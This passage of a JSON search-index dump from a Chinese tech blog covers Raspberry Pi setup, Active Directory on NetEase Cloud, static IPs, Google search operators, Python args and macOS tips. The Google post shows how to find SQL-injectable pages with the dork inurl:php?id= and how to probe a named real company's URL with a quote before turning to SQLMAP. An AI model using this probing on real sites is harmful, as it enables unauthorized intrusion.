application/javascript image/svg+xml; ……重启，刷新页面查看 header，发现有 accept-encoding:gzip, deflate, br如图所示 即表示开启了 brotli 压缩","categories":[],"tags":[]},{"title":"无显示器连接树莓派","slug":"无显示器连接树莓派","date":"2017-12-11T03:07:51.000Z","updated":"2021-02-26T06:05:29.341Z","comments":true,"path":"posts/41827.html","link":"","permalink":"https://awen.me/posts/41827.html","excerpt":"本文主要讲解无显示连接树莓派","text":"本文主要讲解无显示连接树莓派 下载镜像点击这里下载,如图所示: 刻录镜像1.下载如图所示的程序 2.参考如图制作镜像 开启 SSH写个空文件文件到 sd 卡中，文件名 SSH，因为树莓派默认把 SSH 给禁止了，我这里用sublime Text 编辑器创建一个空文件保存在 sd 卡的 根目录下 配置 WiFi写一个配置文件 wpa_supplicant.conf 到 sd 卡的根目录 其中 wpa_supplicant.conf 配置文件如下： country=GB ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev update_config=1 network={ ssid=&quot;ssid&quot; psk=fd105d44432233221ea8ddc60c4a2da03379fe94432c5e4c1f034b89fe0687288a16fdb4a132693fd priority=2 # 优先级，数字越大优先级越高 } network={ ssid=&quot;iphone&quot; psk=aa44443bc3ce7326f17b533fdcb57ac35c9914df5be8532ca70a23c153c7c6ac56dbb priority=1如图所示,这里的密码可以使用命令生成 wpa_passphrase &quot;ssid&quot; &quot;password&quot;连接然后上电就可以连接了，密码自己登陆无线路由器查看，默认密码 raspberry ➜ ~ ssh pi@192.168.50.86 The authenticity of host &apos;192.168.50.86 (192.168.50.86)&apos; can&apos;t be established. ECDSA key fingerprint is SHA256:yDNyMxc152SYJHpzidqaVtxMEVbx1NpIKAfw8GP+8Jc. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added &apos;192.168.50.86&apos; (ECDSA) to the list of known hosts. pi@192.168.50.86&apos;s password: Linux raspberrypi 4.9.59-v7+ #1047 SMP Sun Oct 29 12:19:23 GMT 2017 armv7l The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. SSH is enabled and the default password for the &apos;pi&apos; user has not been changed. This is a security risk - please login as the &apos;pi&apos; user and type &apos;passwd&apos; to set a new password. pi@raspberrypi:~ $ pi@raspberrypi:~ $重置密码 pi@raspberrypi:~ $ sudo passwd pi Enter new UNIX password: Retype new UNIX password: passwd: password updated successfully无密码登录我一向不稀罕用密码登录，因为一麻烦 二不安全 ➜ ~ ssh-copy-id pi@192.168.50.86 /usr/local/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/Users/wenjun/.ssh/id_rsa.pub&quot; /usr/local/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed /usr/local/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys pi@192.168.50.86&apos;s password: Number of key(s) added: 1 Now try logging into the machine, with: &quot;ssh &apos;pi@192.168.50.86&apos;&quot; and check to make sure that only the key(s) you wanted were added. ➜ ~ ➜ ~ ssh pi@192.168.50.86 Linux raspberrypi 4.9.59-v7+ #1047 SMP Sun Oct 29 12:19:23 GMT 2017 armv7l The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sat Dec 9 02:35:21 2017 from 192.168.50.32 pi@raspberrypi:~ $","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"在网易云安装 Active Directory","slug":"在网易云安装-Active-Directory","date":"2017-12-08T04:31:01.000Z","updated":"2021-02-26T06:05:29.322Z","comments":true,"path":"posts/51179.html","link":"","permalink":"https://awen.me/posts/51179.html","excerpt":"本文主要讲解如何在网易云购买的 Windows 2008 r2 服务器搭建 AD 域环境以及演示如何加入域 前言因为网易云提供的操作系统做了安全加固，所以在进行相关配置的时候有很多点需要注意。","text":"本文主要讲解如何在网易云购买的 Windows 2008 r2 服务器搭建 AD 域环境以及演示如何加入域 前言因为网易云提供的操作系统做了安全加固，所以在进行相关配置的时候有很多点需要注意。 绑定弹性公网 IP连接操作系统前需要先绑定弹性公网 IP 地址到对应的实例上。 连接系统Windows 使用 mstscmac 使用 Windows remote Desktop 工具，我这里连接使用此工具 安装前的系统配置开启 NetBIOS 服务1.点击开始–控制面板–管理工具，找到服务，双击打开 找到 TCP/IP NetBIOS Helper 将其从禁止设置为自动后应用后点击确定关闭对话框 2.然后打开命令提示符 在命令提示符输入 sc config netbt start= auto然后再执行 net start lmhosts如图所示 开启 remote registry 服务在服务中开启remote registry 服务，先将启动类型选择为自动-然后应用后点击启动后开启。 开启防火墙端口开启 udp 53 tcp 137 138 139 端口 默认操作系统做了安全加固禁用了这些端口 安装 DNS 服务1.点击服务器管理-添加角色–在弹出的对话框选择下一步，勾选 DNS 会弹出如下对话框 因为网易云默认绑定的弹性公网 IP 和分配的内网 IP 都是动态的，因此需要将 IP 地址改为静态的。 修改 IP 地址打开命令提示符–输入 ipconfig /all 查看 IP 地址 注: 不同的机器分配的网卡名称可能不太一样 可以看到本地连接3 分配的是 公网 IP， 本地连接2 分配的是内网的 IP 地址。我们将其中的 IPV4 地址、子网掩码、默认网关信息记下，其中公网接口的网关是没有的，需要使用 route PRINT 查看，如图所示，我们可以看到59.111.88.1 是公网IP 的网关，记下他 如图所示打开本地连接2的IPV4属性，配置静态 IP 在本案例中，本地连接2是内网地址，配置如下 其中 DNS 设置为本机内网地址 参考如上操作继续配置 本地连接3 配置完毕后，我们继续安装 DNS 服务，此时勾选 DNS 服务，不会弹出警告了，直接下一步下一步即可。 安装 AD 域1.开始菜单–&gt;运行–&gt;输入命令 dcpromo 点击 确定 按钮，如图所示，等待加载完毕大概需要几分钟时间。 2.弹出如下对话框点击下一步 3.新建林 4.设置林名称 5.选择林级别，这里选择2008 R2 6.点击下一步 弹出如下对话框，直接忽略 7.保持默认，下一步 8.设置密码 9.确认无误后点击下一步 10.等待安装 弹出如下对话框完成安装，并重启计算机 客户端链接域1.开启客户端到NetBIOs 服务2.配置DNS 为域服务器到ip地址3.加入域（如果出现无法连接，请确定相关端口是否开启） 输入域服务到用户名和密码 提示欢迎加入域即表示成功 根据提示重启计算机","categories":[],"tags":[{"name":"netease","slug":"netease","permalink":"https://awen.me/tags/netease/"}]},{"title":"windows server 2008 开启 netbios helper 服务 错误1068","slug":"windows-server-2008-开启-netbios-helper-服务-错误1068","date":"2017-12-07T03:06:14.000Z","updated":"2021-02-26T06:05:29.293Z","comments":true,"path":"posts/25425.html","link":"","permalink":"https://awen.me/posts/25425.html","excerpt":"Windows 默认的 netbios 是禁用的，通过服务里面开启 tcp、ip netbios helper 服务 提示如下错误 Windows 无法启动 TCP/IP NetBIOS Helper 服务（位于本地计算机上）。 错误 1068：依赖服务或组建无法启动","text":"Windows 默认的 netbios 是禁用的，通过服务里面开启 tcp、ip netbios helper 服务 提示如下错误 Windows 无法启动 TCP/IP NetBIOS Helper 服务（位于本地计算机上）。 错误 1068：依赖服务或组建无法启动 解决办法 1.在服务中先将 TCP/IP NetBios Helper 设置为自动 然后在命令提示符输入 sc config netbt start= auto然后再执行 net start lmhosts","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://awen.me/tags/Windows/"}]},{"title":"如何在网易云配置静态 IP","slug":"如何在网易云配置静态-IP","date":"2017-12-07T02:28:06.000Z","updated":"2021-02-26T06:05:29.326Z","comments":true,"path":"posts/54079.html","link":"","permalink":"https://awen.me/posts/54079.html","excerpt":"本文主要讲解如何在网易云服务器上配置静态 IP 申请公网 IP首先，确认你的服务器网络类型，是经典网络还是 VPC 网络，并申请公网 IP 地址绑定到对应的实例上。","text":"本文主要讲解如何在网易云服务器上配置静态 IP 申请公网 IP首先，确认你的服务器网络类型，是经典网络还是 VPC 网络，并申请公网 IP 地址绑定到对应的实例上。 Linux 配置1.查看公网 IP 所在接口，可以看到公网 IP 配置在 eth1接口上，IP 地址59.111.94.179，并且子网掩码是255.255.248.0 [root@centos ~]# ifconfig eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1400 inet 10.173.32.146 netmask 255.255.248.0 broadcast 10.173.39.255 inet6 fe80::f816:3eff:fe49:d5cc prefixlen 64 scopeid 0x20&lt;link&gt; ether fa:16:3e:49:d5:cc txqueuelen 1000 (Ethernet) RX packets 28385 bytes 1648648 (1.5 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 122 bytes 34138 (33.3 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 59.111.94.179 netmask 255.255.248.0 broadcast 59.111.95.255 inet6 fe80::f817:ff:fe11:39 prefixlen 64 scopeid 0x20&lt;link&gt; ether fa:17:00:11:00:39 txqueuelen 1000 (Ethernet) RX packets 1574 bytes 8604104 (8.2 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 7 bytes 502 (502.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 0 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 02.查看网关，使用 route -n 查看网关，可以看到公网的 gateway 是59.111.88.1 [root@centos ~]# route -n Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 0.0.0.0 10.173.32.1 0.0.0.0 UG 100 0 0 eth0 0.0.0.0 59.111.88.1 0.0.0.0 UG 101 0 0 eth1 10.173.16.0 10.173.32.1 255.255.248.0 UG 100 0 0 eth0 10.173.32.0 0.0.0.0 255.255.248.0 U 100 0 0 eth0 10.176.48.0 10.173.32.1 255.255.240.0 UG 100 0 0 eth0 10.206.28.0 10.173.32.1 255.255.252.0 UG 100 0 0 eth0 59.111.88.0 0.0.0.0 255.255.248.0 U 100 0 0 eth1 169.254.169.254 10.173.32.1 255.255.255.255 UGH 100 0 0 eth0目前为止，我们已经知道了服务器的IP、子网掩码、网关了 现在开始配置静态 IP 3.编辑配置文件 其默认的配置 dhcp [root@centos ~]# cat /etc/sysconfig/network-scripts/ifcfg-eth1 DEVICE=&quot;eth0&quot; BOOTPROTO=&quot;dhcp&quot; ONBOOT=&quot;yes&quot;修改为 [root@centos ~]# cat /etc/sysconfig/network-scripts/ifcfg-eth1 DEVICE=&quot;eth1&quot; BOOTPROTO=&quot;static&quot; ONBOOT=&quot;yes&quot; IPADDR=59.111.94.179 PREFIX=21 GATEWAY=59.111.88.1 DNS1=114.114.114.114其中，255.255.248.0 用 CIDR 方式表示为21 4.关闭和启用接口 [root@centos ~]# ifdown eth1 Device &apos;eth1&apos; successfully disconnected. [root@centos ~]# ifup eth1 成功激活的连接（D-Bus 激活路径：/org/freedesktop/NetworkManager/ActiveConnection/3） [root@centos ~]# ifconfig eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1400 inet 10.173.32.146 netmask 255.255.248.0 broadcast 10.173.39.255 inet6 fe80::f816:3eff:fe49:d5cc prefixlen 64 scopeid 0x20&lt;link&gt; ether fa:16:3e:49:d5:cc txqueuelen 1000 (Ethernet) RX packets 28654 bytes 1670074 (1.5 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 247 bytes 64048 (62.5 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 59.111.94.179 netmask 255.255.248.0 broadcast 59.111.95.255 inet6 fe80::f817:ff:fe11:39 prefixlen 64 scopeid 0x20&lt;link&gt; ether fa:17:00:11:00:39 txqueuelen 1000 (Ethernet) RX packets 4524 bytes 8787717 (8.3 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 17 bytes 1282 (1.2 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 0 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0windows 配置1.首先还是需要绑定公网 IP 到对应的 Windows 实例 2.然后打开cmd，输入 ipconfig，如图所示，查看公网 ip 的网卡和公网 ip 地址和子网掩码 默认网关不显示 ip 的，使用 route PRINT，看第一行的接口是59.111.88.1 3.然后修改接口的 ip 为静态方式即可。","categories":[],"tags":[{"name":"netease","slug":"netease","permalink":"https://awen.me/tags/netease/"}]},{"title":"检测是否已安装Active Directory域服务二进制文件失败","slug":"检测是否已安装Active-Directory域服务二进制文件失败","date":"2017-12-05T09:28:12.000Z","updated":"2021-02-26T06:05:29.344Z","comments":true,"path":"posts/21512.html","link":"","permalink":"https://awen.me/posts/21512.html","excerpt":"Windows 2008 按照 ad 时提示 检测是否已安装Active Directory域服务二进制文件失败。错误是：请求的操作失败。需要重新启动系统才能回滚所做的更改。","text":"Windows 2008 按照 ad 时提示 检测是否已安装Active Directory域服务二进制文件失败。错误是：请求的操作失败。需要重新启动系统才能回滚所做的更改。 解决办法1.从服务器管理器重启系统 2.控制面板-管理工具–服务–开启remote register服务。 3.重新启动","categories":[],"tags":[]},{"title":"mac 彻底解决 wireshark 权限不足的问题","slug":"mac-彻底解决-wireshark-权限不足的问题","date":"2017-12-04T06:16:52.000Z","updated":"2021-02-26T06:05:29.276Z","comments":true,"path":"posts/43366.html","link":"","permalink":"https://awen.me/posts/43366.html","excerpt":"","text":"直接使用 sudo chown username /dev/bpf*可以赋予其权限，但重启就失效了,要彻底解决，需要执行以下命令后重启。 brew cask install wireshark-chmodbpf","categories":[],"tags":[]},{"title":"如何使用谷歌搜索","slug":"如何使用谷歌搜索","date":"2017-12-01T01:54:35.000Z","updated":"2021-02-26T06:05:29.324Z","comments":true,"path":"posts/63783.html","link":"","permalink":"https://awen.me/posts/63783.html","excerpt":"本文主要介绍谷歌搜索的一些高级技巧","text":"本文主要介绍谷歌搜索的一些高级技巧 美元换算例如 1 usd in rmb 查看国家 GDP site例如: site:domain 表示只搜索该域名下的内容 搜索文档例如: site:gov.cn inurl:doc 北京低端人口表示搜索所有 gov.cn 域名下 inurl 表示后缀为 doc 的 Word 文档空格跟上关键词 或者 北京低端人口 site:gov.cn filetype:doc基本使用语法 operator:search_term 高级操作符中以all开头的操作符在一般情况下一个查询中只能使用一次，不能和其他操作符混用 intext: 把网页中的正文内容中的某个字符做为搜索条件(但是只能搜索冒号后接的一个关键字).例如在google里输入:intext:钓鱼(广义的).将返回所有在网页正文部分包含”钓鱼(广义的)”的网页，可以与其他操作符混合使用，可单独使用 allintext: 使用方法和intext类似，能接多个关键字，能与其他操作符混合使用，可单独使用 intitle:搜索网页标题中是否有所输入字符.例如输入:intitle:五点共圆.将返回所有网页标题中包含”五点共圆”的网页，可以与其他操作符混合使用，可单独使用 allintitle: 和ntitle类似，能接多个关键字，但是不能与其他操作符混合使用，可单独使用 cache:输入URL，搜索特定页面的缓存快照，即使目标页面发生变动甚至不存在了，依然可以看到它的副本 define:搜索输入关键词或关键词组的定义来源链接,例如搜索:define:script,将返回关于script的定义，该操作符不能与其他操作符及关键字混用。 filetype:搜索指定类型的文件.例如输入:filetype:asp.将返回所有以asp结尾的文件的URL，可以与其他操作符混合使用[4] ext: 与filetype等价 info:搜索输入URL的摘要信息和其他相关信息，该操作符不能与其他操作符及关键字混用 inurl:搜索输入字符是否存在于URL中.可以联合site指定来找后台、fck之类，可以与其他操作符混合使用，可单独使用 allinurl: 类似inurl:,但是可指定多个字符，不能与其他操作符混合使用，可单独使用 link:搜索链接到所输入URL的页面，该操作符不需要关键字，不能与其他操作符及关键字混用 site: (这个下面Ⅲ也会讲)将搜索范围缩小到特定的网站，域或子域 related: 冒号后接一个URL，搜索与该URL相关的页面，该操作符不能与其他操作符及关键字混用 numrange: 冒号后接数字范围，用一个减号两边接数字来表示。减号左边为最小值，右边为最大值，从而搜索数字 inanchor: 搜索一个HTML标记中的一个链接的文本表现形式，即在链接文本中搜索冒号后紧接的一个关键字 至于“链接文本”，比如GNU/Linux以上代码中的“GNU/Linux”就是链接文本 stocks: 搜索关于指定公司的股票市场信息 insubject: 搜索Google组的标题行 daterange: 搜索某个日期范围内Google做索引的网页 判断是否存在 sql 注入例如判断一个php 站点是否有 sql 注入，可以先 Google 探测 inurl:php?id= 例如 http://www.ampak.com.tw/product.php?id=21我们在其最后加上‘ http://www.ampak.com.tw/product.php?id=21‘得到如下信息，则表示存在 sql 注入，此后我们可以通过 sql 注入工具进行测试是否有漏洞，例如 SQLMAP 只搜索中文网页lr=lang_zh-CNlr(Language Restrict)：搜索内容的语言限定限定只搜索某种语言的网页。如果lr参数为空，则为搜索所有网页。常用的有：lr=lang_zh-CN只搜索简体中文网页lr=lang_zh-TW只搜索繁体中文网页lr=lang_zh-CN|lang_zh-TW搜索所有中文网页lr=lang_en-只搜索英文网页","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"https://awen.me/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"什么是 args 和 kwargs","slug":"Python-tips-什么是-args和-kwargs？","date":"2017-11-30T05:40:16.000Z","updated":"2021-02-26T06:05:29.262Z","comments":true,"path":"posts/65059.html","link":"","permalink":"https://awen.me/posts/65059.html","excerpt":"先来看个例子： #!/usr/bin/python3 def foo(*args,**kwargs): print(&apos;args = &apos;, args) print(&apos;kwargs = &apos;,kwargs) if __name__ == &apos;__main__&apos;: foo(1,2,3,4) foo(a=1,b=2,c=3) foo(1,2,3,4,a=1,b=2,c=3) foo(&apos;a&apos;, 1, None, a=1, b=&apos;2&apos;, c=3)","text":"先来看个例子： #!/usr/bin/python3 def foo(*args,**kwargs): print(&apos;args = &apos;, args) print(&apos;kwargs = &apos;,kwargs) if __name__ == &apos;__main__&apos;: foo(1,2,3,4) foo(a=1,b=2,c=3) foo(1,2,3,4,a=1,b=2,c=3) foo(&apos;a&apos;, 1, None, a=1, b=&apos;2&apos;, c=3) 输出结果如下： (&apos;args = &apos;, (1, 2, 3, 4)) (&apos;kwargs = &apos;, {}) (&apos;args = &apos;, ()) (&apos;kwargs = &apos;, {&apos;a&apos;: 1, &apos;c&apos;: 3, &apos;b&apos;: 2}) (&apos;args = &apos;, (1, 2, 3, 4)) (&apos;kwargs = &apos;, {&apos;a&apos;: 1, &apos;c&apos;: 3, &apos;b&apos;: 2}) (&apos;args = &apos;, (&apos;a&apos;, 1, None)) (&apos;kwargs = &apos;, {&apos;a&apos;: 1, &apos;c&apos;: 3, &apos;b&apos;: &apos;2&apos;})可以看到，这两个是python中的可变参数。*args表示任何多个无名参数，它是一个tuple；**kwargs表示关键字参数，它是一个dict。并且同时使用*args和**kwargs时，必须*args参数列要在**kwargs前，像foo(a=1, b=’2’, c=3, a’, 1, None, )这样调用的话，会提示语法错误“SyntaxError: non-keyword arg after keyword arg”。 还有一个很漂亮的用法，就是创建字典： def kw_dict(**kwargs): return kwargs print kw_dict(a=1,b=2,c=3) == {&apos;a&apos;:1, &apos;b&apos;:2, &apos;c&apos;:3}其实python中就带有dict类，使用dict(a=1,b=2,c=3)即可创建一个字典了。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"mac 设置自动排列文件和文件夹","slug":"mac-设置自动排列文件和文件夹","date":"2017-11-29T08:11:27.000Z","updated":"2021-02-26T06:05:29.277Z","comments":true,"path":"posts/28251.html","link":"","permalink":"https://awen.me/posts/28251.html","excerpt":"在创建新的文件和文件夹时，mac默认都是乱七八糟的。类似这样。","text":"在创建新的文件和文件夹时，mac默认都是乱七八糟的。类似这样。 如果每次都手动真理真的很僵硬。 自动排列1.右键– 查看显示选项 2.如图所示进行设置","categories":[],"tags":[{"name":"mac 小技巧","slug":"mac-小技巧","permalink":"https://awen.me/tags/mac-%E5%B0%8F%E6%8A%80%E5%B7%A7/"}]},{"title":"如何给mac的root用户设置密码","slug":"如何禁止mac的root用户","date":"2017-11-29T01:54:39.000Z","updated":"2021-02-26T06:05:29.329Z","comments":true,"path":"posts/64989.html","link":"","permalink":"https://awen.me/posts/64989.html","excerpt":"mac 最新版本被爆出漏洞，输入root 不需要输入密码即可登录 本文主要讲解如何禁止root用户","text":"mac 最新版本被爆出漏洞，输入root 不需要输入密码即可登录 本文主要讲解如何禁止root用户 漏洞演示操作步骤方法11.打开 「系统偏好设置」—用户与群组 2.解锁后选择「登录选项」—网络账户服务器，点击加入 3.选择「打开目录实用工具」 4.在「目录使用工具」–解锁后选择编辑–启用Root用户并更改root密码 方法2➜ ~ sudo passwd root Password: Changing password for root. New password: Retype new password:不过开启root有个副作用，就是登录的时候会有个其他 即使你用户与群组关闭了访客登录 所以最好的办法是等苹果更新。","categories":[],"tags":[{"name":"mac 小技巧","slug":"mac-小技巧","permalink":"https://awen.me/tags/mac-%E5%B0%8F%E6%8A%80%E5%B7%A7/"}]},{"title":"Bartender 和Vanilla 这两个隐藏图标的软件该选谁","slug":"Bartender-和Vanilla-这两个隐藏图标的软件该选谁","date":"2017-11-28T11:47:34.000Z","updated":"2021-02-26T06:05:29.240Z","comments":true,"path":"posts/15023.html","link":"","permalink":"https://awen.me/posts/15023.html","excerpt":"在mac上，经常要开很多软件，这导致菜单栏的图标满满的挤在了一起，这个时候，我就需要一款软件来隐藏一部分软件的图标，因为我只需要他静静的工作就行，购买了2款软件 Vanilla 和 Bartender。 价格分别是Vanilla 3.99美元，Bartender 15美元（折合人民币104）。","text":"在mac上，经常要开很多软件，这导致菜单栏的图标满满的挤在了一起，这个时候，我就需要一款软件来隐藏一部分软件的图标，因为我只需要他静静的工作就行，购买了2款软件 Vanilla 和 Bartender。 价格分别是Vanilla 3.99美元，Bartender 15美元（折合人民币104）。 Vanilla在我付了3.99购买了他的完整功能后（免费版不能删除图标）。我发现这个软件基本功能是ok的，但是在我使用过程中出现了很多问题。比如： 1.会莫名其妙的把菜单栏的其他图标 比如通知图标和声音图标重叠在一起。2.会莫名奇妙的自动显示已经删除的图标3.会导致菜单栏的颜色不一致。 无奈之下我去申请了退款 Bartender目前的版本是3.0，默认可以免费使用所有功能4周。 你需要对菜单栏出现的图标进行选择是永不显示，还是隐藏起来 在我使用了一段时间没有发现有 Vanilla 类似的问题，所以果断买了，虽然贵很多。不过看着菜单栏非常干净简洁的样子，也值了","categories":[],"tags":[{"name":"mac 小技巧","slug":"mac-小技巧","permalink":"https://awen.me/tags/mac-%E5%B0%8F%E6%8A%80%E5%B7%A7/"}]},{"title":"使用 near Lock 解锁/锁定你的MAC","slug":"使用-near-Lock-解锁-锁定你的MAC","date":"2017-11-25T04:14:21.000Z","updated":"2021-02-26T06:05:29.306Z","comments":true,"path":"posts/64493.html","link":"","permalink":"https://awen.me/posts/64493.html","excerpt":"在上一家单位，有一次中午休息时间我出去吃饭了，电脑没锁，同事在我们内部群里发了句“我下午请大家喝奶茶”!我当时正在路上，看到手机 QQ 的信息都惊呆了。这到底是请还是不请呢？哈哈。 从此以后，我就把电脑的密码保护开启了。","text":"在上一家单位，有一次中午休息时间我出去吃饭了，电脑没锁，同事在我们内部群里发了句“我下午请大家喝奶茶”!我当时正在路上，看到手机 QQ 的信息都惊呆了。这到底是请还是不请呢？哈哈。 从此以后，我就把电脑的密码保护开启了。 开启密码保护1.首先，在设置–安全性与隐私中找到通用，勾选进入睡眠或开始屏幕保护程序立即要求输入密码 2.开启屏幕保护或节能中调整关闭显示器的时间，一般我不设置屏幕保护，设置–节能–调整为1分钟 这样的好处是即你刚离开1分钟就会锁上电脑，但是同时也带来了诸多不便，就是你有时候比如去开发部和开发聊个东西，或者去上个厕所回来都要频繁的输入密码。有点烦人。 那有没有一种方法可以勉输密码还很安全的呢？ 答案是:有 方法1你需要有一个 apple watch，具体方法你可以 Google，不过我没有，所以直接跳过。 方法2借助第三方软件，比如今天我推荐的 near lock。 需要在手机端和电脑端安装软件，然后在手机端设置 mac 密码绑定 mac 电脑即可。 特点： 1.需要开启蓝牙，需要在一定范围之内，比如1米。如果超过1米则自动锁定 mac，如果低于这个值则自动解锁 mac。 2.假设你离开了有人去动你的电脑，则会自动拍照、哈哈哈。 3.还支持在 mac 和手机之前同步剪贴板内容。（不过最新的 macos 都默认就支持） 手机端设置，手机端高级功能需要25块钱。","categories":[],"tags":[{"name":"小工具","slug":"小工具","permalink":"https://awen.me/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/"}]},{"title":"使用Authy保存你的两步验证code","slug":"使用Authy保存你的两步验证code","date":"2017-11-24T02:16:30.000Z","updated":"2021-02-26T06:05:29.307Z","comments":true,"path":"posts/59919.html","link":"","permalink":"https://awen.me/posts/59919.html","excerpt":"现在各种互联网安全事件层出不穷，比如各种数据泄露事件。因此开启 [两步验证] 很有必要。 之前一直用 Google 的 auth 工具，不过Google 的这个工具我此前一直安装在 Android 手机上，后来那个手机淘汰了 换了 iPhone 然后要切过来表示很麻烦，并且有时候我手机没带或者没电了，想登录一个网站都没法登（博主的所有网站能开两步验证的都开了）","text":"现在各种互联网安全事件层出不穷，比如各种数据泄露事件。因此开启 [两步验证] 很有必要。 之前一直用 Google 的 auth 工具，不过Google 的这个工具我此前一直安装在 Android 手机上，后来那个手机淘汰了 换了 iPhone 然后要切过来表示很麻烦，并且有时候我手机没带或者没电了，想登录一个网站都没法登（博主的所有网站能开两步验证的都开了） 后来发现了Authy，这个工具提供各种平台的客户端，在不同终端之间进行同步。至少目前用起来很方便。不过也存在一个问题，那就是安全问题，因为他需要把验证信息加密保存在服务端，不然咋同步？ 话说回来，这只是个二次验证码，没有密码也没用，所以目前看还是比较安全的一种方式。至少方便了许多。 如果你说有个国内的公司也做这样的软件，我会不会用？答案是，不会。我不相信国内任何公司的产品。尤其是那些有过黑历史的安全公司或流氓公司的安全类产品。","categories":[],"tags":[{"name":"小工具","slug":"小工具","permalink":"https://awen.me/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/"}]},{"title":"使用 Adblock 屏蔽网站垃圾信息","slug":"使用-Adblock-屏蔽网站","date":"2017-11-21T06:07:27.000Z","updated":"2021-02-26T06:05:29.302Z","comments":true,"path":"posts/19317.html","link":"","permalink":"https://awen.me/posts/19317.html","excerpt":"在使用 adblock 的时候，你应该要了解一些基本的 html 知识。理解 css 的基本字段含义，比如 id 是干什么的。class 是干什么的。另外还要能使用浏览器查看源码，能看懂源码，然后就可以开始动手干了。 adblock 是一款开源的跨平台的广告过滤插件，它可以安装在各种常见的浏览器上对一些恶意烦人的广告进行屏蔽。","text":"在使用 adblock 的时候，你应该要了解一些基本的 html 知识。理解 css 的基本字段含义，比如 id 是干什么的。class 是干什么的。另外还要能使用浏览器查看源码，能看懂源码，然后就可以开始动手干了。 adblock 是一款开源的跨平台的广告过滤插件，它可以安装在各种常见的浏览器上对一些恶意烦人的广告进行屏蔽。 安装安装很简单，打开https://adblockplus.org/,它会自动识别你当前使用的浏览器，然后点击安装到 XXX 即可 安装完毕之后，开启他，以 Chrome 为例，地址栏输入chrome://extensions/ 打开扩展中心找到他，点击启用 基本使用然后点击选项 打开后添加如图所示的几个规则，基本上大部分网站的恶意广告都可以被屏蔽 自定义屏蔽如果有些网站的广告没有被屏蔽，你希望将其屏蔽掉有两种方式： 1.点击地址栏后面的扩展图标，选择单击后选择–拦截元素 此时，屏蔽会自动捕获对应的元素，你可以移动选择到对应的元素所在地，点击 即可出现一个拦截规则窗口，点击添加对应的块元素就被屏蔽了 2.自己写规则，需要有 html + css 基础 我们打开扩展的选项，切换到自定义过滤 可以看到我们刚才屏蔽的百度，他的代码是这样的 baidu.com##.opr-recommends-merge-content看不懂？没关系，我们看一段代码： &lt;div id=&quot;LswXCisOsS&quot; style=&quot;display: none; background-color: #A00; position: fixed; top: 0; width: 100%; z-index: 9999; left: 0; font-size: 16px; color: #fff; text-align: center; padding: 10px; opacity: 0.8;&quot;&gt;请将我们加入您的广告过滤器的白名单，请支持开源站点。谢谢您。&lt;/div&gt;这段代表表示这个 div 分配了他一个 id，通常网页中的 id 或 class 属性是标识这个元素的，我们可以根据这个 id 的值来为其附上各种熟悉，比如 css 添加style 或 js 添加一些动作。那么同样的 adblock 也是根据这个 id 的 value 找到这个属性 对其进行屏蔽，通常对于 id 的屏蔽规则如下： domain.com###idvalue例如上面的div，如果希望屏蔽他，假设他的网站是www.baidu.com 则规则如下: www.baidu.com###LswXCisOsS 如果其id 是 class 则是这样写： www.baidu.com##.LswXCisOsS如果其 class 属性有多个值例如 &lt;div class=&quot;a1 b1&quot;&gt;&lt;/div&gt;只需要匹配一个就可以 www.baidu.com##.a1是不是很简单? 那么怎么看网站的元素呢？以 Chrome 为例，网页空白处，右键选择显示网页源文件。或者 view-source:url白名单 如果你有些网站不希望被屏蔽，你可以添加到白名单","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"https://awen.me/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"chrome 和火狐非安全端口限制","slug":"chrome-和火狐非安全端口限制","date":"2017-11-21T03:05:19.000Z","updated":"2021-02-26T06:05:29.272Z","comments":true,"path":"posts/2659.html","link":"","permalink":"https://awen.me/posts/2659.html","excerpt":"在搭建 web 